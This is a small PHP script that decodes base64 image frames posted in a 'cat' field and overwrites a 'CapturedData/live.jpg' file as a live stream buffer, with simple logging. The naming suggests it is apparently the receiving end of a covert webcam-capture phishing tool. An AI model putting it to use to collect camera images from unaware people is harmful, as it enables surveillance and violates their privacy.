<?php
// Overwrite the same file to act as a live stream buffer.
$live_stream_file = '../../CapturedData/live.jpg';

// Get the base64-encoded image data from the POST request.
$imageData = $_POST['cat'];

if (!empty($imageData)) {
    // Log that a frame was received.
    error_log("[#] Live frame received" . "\r\n", 3, "Log.log");

    // Remove the data URI scheme prefix (e.g., "data:image/jpeg;base64,")
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);

    // Decode the base64 data.
    $unencodedData = base64_decode($filteredData);

    // Write the image data to the live stream file, overwriting the previous frame.
    $fp = fopen($live_stream_file, 'wb');
    if ($fp) {
        fwrite($fp, $unencodedData);
        fclose($fp);
    } else {
        error_log("[!] Failed to open live stream file for writing." . "\r\n", 3, "Log.log");
    }
} else {
    error_log("[!] Received empty image data." . "\r\n", 3, "Log.log");
}

// Respond to the client. An empty response is fine.
exit();
?>


